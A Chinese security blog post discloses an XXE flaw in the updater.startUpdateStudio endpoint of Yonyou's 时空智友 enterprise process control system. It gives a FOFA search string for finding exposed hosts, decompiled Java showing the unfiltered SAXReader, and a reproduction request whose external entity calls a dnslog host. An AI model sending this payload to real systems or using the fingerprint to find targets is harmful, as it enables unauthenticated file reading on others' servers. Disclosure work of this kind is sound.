---
title: "时空智友企业流程化管控系统 updater.startUpdateStudio XXE漏洞"
source: https://mrxn.net/jswz/yonyou-updater-startUpdateStudio-xxe.html
asset_dir: assets/时空智友企业流程化管控系统-updater.startupdatestudio-xxe漏洞
---

# 时空智友企业流程化管控系统 updater.startUpdateStudio XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/7 08:36
- 1049浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

SQL

鉴权

身份认证

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)时空智友企业流程化管控系统 updater.startUpdateStudio 接口处存在[XML实体注入](https://mrxn.net/tag/XXE)漏洞，未经身份认证的攻击者可以利用此漏洞读取系统文件。

漏洞预警服务

# fofa语法

> `body="login.jsp?login=null"`

# 漏洞分析

这个漏洞源自前一篇文章时随便看了一眼发现的 [时空智友企业流程化管控系统 updater.getStudioFile 任意文件读取漏洞](https://mrxn.net/jswz/yonyou-updater-getStudioFile-fileread.html)

```
import org.dom4j.io.SAXReader;

....

public String startUpdateStudio(HttpServletRequest object, HttpServletResponse object2, Document object3) {
    block11: {
        Object object4;
        object = object3.getRootElement();
        object2 = new ArrayList();
        object = object.element("files").elementIterator();
        while (object.hasNext()) {
            object3 = (Element)object.next();
            object4 = new a(this);
            new a(this).a = object3.getTextTrim();
            ((a)object4).b = object3.attribute("del") == null ? false : object3.attribute("del").getStringValue().equalsIgnoreCase("true");
            ((ArrayList)object2).add(object4);
        }
```

深入探索

VPN服务

安全研究工具

编码转换工具

通过 SAXReader 解析器读取外部 XML 内容（来自object3），并且未进行任何过滤或校验检查，造成 XML外部实体注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)（XXE漏洞）。

网络安全

# 漏洞复现

```
POST /formservice/?service=updater.startUpdateStudio HTTP/1.1
Host: yonyou.mrxn.net
Content-Type: multipart/form-dataaaaaaa

----.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.test.dnslog.cc/xxe_test">
%remote;]>
<root/>
```

深入探索

物流软件安全

传输层安全性协议

数据库

在 DNSLOG 平台成功收到 DNS 和 HTTP 请求响应

[![时空智友企业流程化管控系统 updater.startUpdateStudio XXE漏洞](images/img-001-4adc59fc93bf.webp)](https://image.mrxn.net/859e9268e34c4bbb96e51ee464168f87.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

安全工具开发
